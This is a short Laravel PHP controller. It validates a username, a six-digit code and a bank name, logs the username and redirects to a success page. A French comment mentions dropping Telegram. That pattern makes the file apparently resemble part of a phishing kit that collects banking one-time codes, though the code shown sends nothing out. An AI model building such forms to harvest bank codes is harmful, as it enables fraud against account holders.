<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class ValiderController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'code' => 'required|digits:6',
            'bank' => 'required|string|max:100',
        ]);

        // Log simple sans Telegram
        Log::info('Validation submitted - User: ' . $validated['username']);

        // Redirection vers confirmation
        return redirect()->route('success');
    }
}
